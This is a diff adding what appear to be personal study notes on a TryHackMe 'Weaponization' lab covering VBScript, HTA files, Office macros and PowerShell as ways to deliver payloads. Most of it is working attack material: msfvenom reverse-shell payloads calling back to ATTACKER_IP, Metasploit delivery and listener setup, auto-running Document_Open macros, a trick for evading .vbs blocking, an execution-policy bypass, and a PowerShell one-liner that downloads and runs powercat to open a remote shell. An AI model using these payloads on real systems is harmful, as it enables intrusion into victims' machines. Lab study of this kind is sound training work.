@@ -1,0 +1,350 @@
+# Weaponization
+
+## TASK 3 Windows Scripting Host - WSH
+
+Windows scripting host is a built-in Windows tool that runs batch files to automate tasks.
+It uses cscript.exe (command-line scripts) and wscript.exe (UI scripts) to execute VBScript files like .vbs and .vbe. 
+Scripts run with the same permissions as the user, making it useful for red teamers.
+
+Example 1: 
+
+    Create a message box
+        ```
+        Dim message 
+        message = "Welcome to THM"
+        MsgBox message
+        ```
+
+    Save this as *hello.vbs* and run it with:
+        ```
+        c:\Windows\System32>wscript c:\Users\thm\Desktop\hello.vbs
+        ```
+
+Example 2: 
+    Run an executable
+        ```
+        Set shell = WScript.CreateObject("Wscript.Shell")
+        shell.Run("C:\Windows\System32\calc.exe " & WScript.ScriptFullName),0,True
+        ```
+
+    Save this as *payload.vbs* and execute it:
+        ```
+        c:\Windows\System32>wscript c:\Users\thm\Desktop\payload.vbs
+        c:\Windows\System32>cscript.exe c:\Users\thm\Desktop\payload.vbs
+        ```
+
+If .vbs files are blacklisted, rename to *.txt* and run:
+
+    ```
+    c:\Windows\System32>wscript /e:VBScript c:\Users\thm\Desktop\payload.txt
+    ```
+
+## TASK 4 An HTML Application - HTA
+
+An HTML Application - HTA
+
+    HTA (HTML Application) files are dynamic HTML pages with JScript or VBScript. 
+    They can be executed using the LOLBIN tool `mshta`, either directly or via Internet Explorer.
+
+    In the following example, we use an ActiveXObject in our payload as a proof of concept to execute cmd.exe. 
+    Consider the following HTML code:
+
+        ```
+        <html>
+        <body>
+        <script>
+            var c= 'cmd.exe'
+            new ActiveXObject('WScript.Shell').Run(c);
+        </script>
+        </body>
+        </html>
+        ```
+
+    Then serve the payload.hta from a web server, this could be done from the attacking machine as follows,
+
+        ```
+        user@machine$ python3 -m http.server 8090
+        Serving HTTP on 0.0.0.0 port 8090 (http://0.0.0.0:8090/)
+        ```
+
+    On the victim machine, visit the malicious link using Microsoft Edge: http://ATTACKER_IP:8090/payload.hta. 
+    Note that ATTACKER_IP is the AttackBox's IP address.
+
+    Once we press "Run," the payload.hta gets executed, invoking cmd.exe. 
+    The following demonstrates the successful execution of cmd.exe.
+
+    HTA Reverse Connection
+
+        We can create a reverse shell payload as follows,
+
+            ```
+            user@machine$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f hta-psh -o thm.hta
+            [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+            [-] No arch selected, selecting arch: x64 from the payload
+            No encoder specified, outputting raw payload
+            Payload size: 460 bytes
+            Final size of hta-psh file: 7692 bytes
+            Saved as: thm.hta
+            ```
+
+        We use the msfvenom from the Metasploit framework to generate a malicious payload to connect back to the attacking machine. 
+        We used the following payload to connect the windows/x64/shell_reverse_tcp to our IP and listening port.
+
+        On the attacking machine, we need to listen to the port 443 using nc. 
+        Please note this port needs root privileges to open, or you can use different ones.
+
+        Once the victim visits the malicious URL and hits run, we get the connection back.
+
+            ```
+            user@machine$ sudo nc -lvp 443
+            listening on [any] 443 ...
+            ATTACKER_IP: inverse host lookup failed: Unknown host
+            connect to [ATTACKER_IP] from (UNKNOWN) [10.10.201.254] 52910
+            Microsoft Windows [Version 10.0.17763.107]
+            (c) 2018 Microsoft Corporation. All rights reserved.
+
+            C:\Users\thm\AppData\Local\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\TempState\Downloads>
+            ```
+
+Malicious HTA via Metasploit 
+
+    There is another way to generate and serve malicious HTA files using the Metasploit framework. 
+    First, run the Metasploit framework using msfconsole -q command. 
+    Under the exploit section, there is exploit/windows/misc/hta_server, which requires selecting and setting information such as LHOST, LPORT, SRVHOST, Payload, and finally, executing exploit to run the module.
+
+        ```
+        msf6 > use exploit/windows/misc/hta_server
+        msf6 exploit(windows/misc/hta_server) > set LHOST ATTACKER_IP
+        LHOST => ATTACKER_IP
+        msf6 exploit(windows/misc/hta_server) > set LPORT 443
+        LPORT => 443
+        msf6 exploit(windows/misc/hta_server) > set SRVHOST ATTACKER_IP
+        SRVHOST => ATTACKER_IP
+        msf6 exploit(windows/misc/hta_server) > set payload windows/meterpreter/reverse_tcp
+        payload => windows/meterpreter/reverse_tcp
+        msf6 exploit(windows/misc/hta_server) > exploit
+        [*] Exploit running as background job 0.
+        [*] Exploit completed, but no session was created.
+        msf6 exploit(windows/misc/hta_server) >
+        [*] Started reverse TCP handler on ATTACKER_IP:443
+        [*] Using URL: http://ATTACKER_IP:8080/TkWV9zkd.hta
+        [*] Server started.
+        ```
+
+    On the victim machine, once we visit the malicious HTA file that was provided as a URL by Metasploit, we should receive a reverse connection.
+
+        ```
+        user@machine$ [*] 10.10.201.254    hta_server - Delivering Payload
+        [*] Sending stage (175174 bytes) to 10.10.201.254
+        [*] Meterpreter session 1 opened (ATTACKER_IP:443 -> 10.10.201.254:61629) at 2021-11-16 06:15:46 -0600
+        msf6 exploit(windows/misc/hta_server) > sessions -i 1
+        [*] Starting interaction with 1...
+
+        meterpreter > sysinfo
+        Computer        : DESKTOP-1AU6NT4
+        OS              : Windows 10 (10.0 Build 14393).
+        Architecture    : x64
+        System Language : en_US
+        Domain          : WORKGROUP
+        Logged On Users : 3
+        Meterpreter     : x86/windows
+        meterpreter > shell
+        Process 4124 created.
+        Channel 1 created.
+        Microsoft Windows [Version 10.0.14393]
+        (c) 2016 Microsoft Corporation. All rights reserved.
+
+        C:\app>
+        ```
+
+## TASK 5 Visual Basic for Application - VBA
+
+VBA (Visual Basic for Applications) is a Microsoft programming language for automating tasks in Office applications like Word and Excel.
+Macros in VBA can automate processes and access low-level Windows functionality.
+
+Example 1: Display a message box
+    ```
+    Sub THM()
+        MsgBox ("Welcome to Weaponization Room!")
+    End Sub
+    ```
+
+Run the macro using F5 or Run → Run Sub/UserForm.
+
+To execute VBA code automatically when the document opens:
+    ```
+    Sub Document_Open()
+        THM
+    End Sub
+
+    Sub AutoOpen()
+        THM
+    End Sub
+
+    Sub THM()
+        MsgBox ("Welcome to Weaponization Room!")
+    End Sub
+    ```
+
+Save the file as a Macro-Enabled format (.doc or .docm). 
+Enable macros when reopening the document to execute the code.
+
+Example 2: Run an executable (e.g., calc.exe)
+    ```
+    Sub PoC()
+        Dim payload As String
+        payload = "calc.exe"
+        CreateObject("Wscript.Shell").Run payload,0
+    End Sub
+    ```
+
+Test the code before saving. Ensure AutoOpen() and Document_Open() functions are included.
+
+Practical:
+
+    Creating a reverse shell payload:
+
+        ```
+        user@AttackBox$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f vba
+        ```
+
+    Modify the output to use Document_Open() for Word documents. Copy the payload into the macro editor.
+
+    Set up a Metasploit listener:
+
+        ```
+        user@AttackBox$ msfconsole -q
+        msf5 > use exploit/multi/handler
+        msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
+        msf5 exploit(multi/handler) > set LHOST ATTACKER_IP
+        msf5 exploit(multi/handler) > set LPORT 443
+        msf5 exploit(multi/handler) > exploit
+        ```
+
+    When the malicious document is opened, the reverse shell connects back to the attacker.
+
+## TASK 6 PowerShell - PSH
+
+PowerShell (PSH)
+
+    PowerShell is an object-oriented programming language executed from the Dynamic Language Runtime (DLR) in .NET with some exceptions for legacy uses. 
+    Check out the TryHackMe room, Hacking with PowerShell for more information about PowerShell.
+
+    Red teamers rely on PowerShell in performing various activities, including initial access, system enumerations, and many others. 
+    Let's start by creating a straightforward PowerShell script that prints "Welcome to the Weaponization Room!" as follows,
+
+        ```
+        Write-Output "Welcome to the Weaponization Room!"
+        ```
+
+    Save the file as thm.ps1. With the Write-Output, we print the message "Welcome to the Weaponization Room!" to the command prompt. 
+    Now let's run it and see the result.
+
+        ```
+        C:\Users\thm\Desktop>powershell -File thm.ps1
+        File C:\Users\thm\Desktop\thm.ps1 cannot be loaded because running scripts is disabled on this system. For more
+        information, see about_Execution_Policies at http://go.microsoft.com/fwlink/?LinkID=135170.
+            + CategoryInfo          : SecurityError: (:) [], ParentContainsErrorRecordException
+            + FullyQualifiedErrorId : UnauthorizedAccess
+        ```
+
+Execution Policy
+
+    PowerShell's execution policy is a security option to protect the system from running malicious scripts. 
+    By default, Microsoft disables executing PowerShell scripts .ps1 for security purposes. 
+    The PowerShell execution policy is set to Restricted, which means it permits individual commands but not run any scripts.
+
+    You can determine the current PowerShell setting of your Windows as follows,
+
+        ```
+        PS C:\Users\thm> Get-ExecutionPolicy
+        Restricted
+        ```
+
+    We can also easily change the PowerShell execution policy by running:
+
+        ```
+        PS C:\Users\thm\Desktop> Set-ExecutionPolicy -Scope CurrentUser RemoteSigned
+
+        Execution Policy Change
+        The execution policy helps protect you from scripts that you do not trust. Changing the execution policy might expose
+        you to the security risks described in the about_Execution_Policies help topic at
+        http://go.microsoft.com/fwlink/?LinkID=135170. Do you want to change the execution policy?
+        [Y] Yes [A] Yes to All [N] No [L] No to All [S] Suspend [?] Help (default is "N"): A
+        ```
+
+Bypass Execution Policy
+
+    Microsoft allows bypassing execution policy restrictions by using the `-ExecutionPolicy Bypass` argument. 
+    This ensures PowerShell scripts run without restrictions.
+
+        ```
+        C:\Users\thm\Desktop>powershell -ex bypass -File thm.ps1
+        Welcome to Weaponization Room!
+        ```
+
+    Use PowerShell tool powercat for a reverse shell. 
+    Download it from GitHub, then host it via a web server on the AttackBox.
+
+        ```
+        user@machine$ git clone https://github.com/besimorhino/powercat.git
+        Cloning into 'powercat'...
+        remote: Enumerating objects: 239, done.
+        remote: Counting objects: 100% (4/4), done.
+        remote: Compressing objects: 100% (4/4), done.
+        remote: Total 239 (delta 0), reused 2 (delta 0), pack-reused 235
+        Receiving objects: 100% (239/239), 61.75 KiB | 424.00 KiB/s, done.
+        Resolving deltas: 100% (72/72), done.
+        ```
+
+    Set up a web server on the AttackBox to serve powercat.ps1. 
+    Change to the powercat directory and start listening on port 8080.
+
+        ```
+        user@machine$ cd powercat
+        user@machine$ python3 -m http.server 8080
+        Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
+        ```
+
+    Use nc on the AttackBox to listen on port 1337 for the victim's connection.
+
+        ```
+        user@machine$ nc -lvp 1337
+        ```
+
+    On the victim machine, download and execute the payload using PowerShell as follows:
+
+        ```
+        C:\Users\thm\Desktop> powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://ATTACKBOX_IP:8080/powercat.ps1');powercat -c ATTACKBOX_IP -p 1337 -e cmd"
+        ```
+
+    The victim downloads and executes the powercat.ps1 payload from the AttackBox, sending a reverse connection to the listener on port 1337. Within seconds, the connection is established.
+
+        ```
+        user@machine$ nc -lvp 1337
+        listening on [any] 1337 ...
+        10.10.12.53: inverse host lookup failed: Unknown host
+        connect to [10.8.232.37] from (UNKNOWN) [10.10.12.53] 49804
+        Microsoft Windows [Version 10.0.14393]
+        (c) 2016 Microsoft Corporation. All rights reserved.
+
+        C:\Users\thm>
+        ```
+
+## TASK 9
+
+1.  ATTACKER reate payload
+    msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f hta-psh -o thm.hta
+
+2.  ATTACKER setup server 
+    python3 -m http.server 456
+
+3.  VICTIM get payload
+    http://ATTACKER_IP:456/thm.hta
+
+4.  ATTACKER setup listener
+    nc -lnvp 443
+
+5.  ATTACKER find flag in Desktop.
+
+## Appendix:
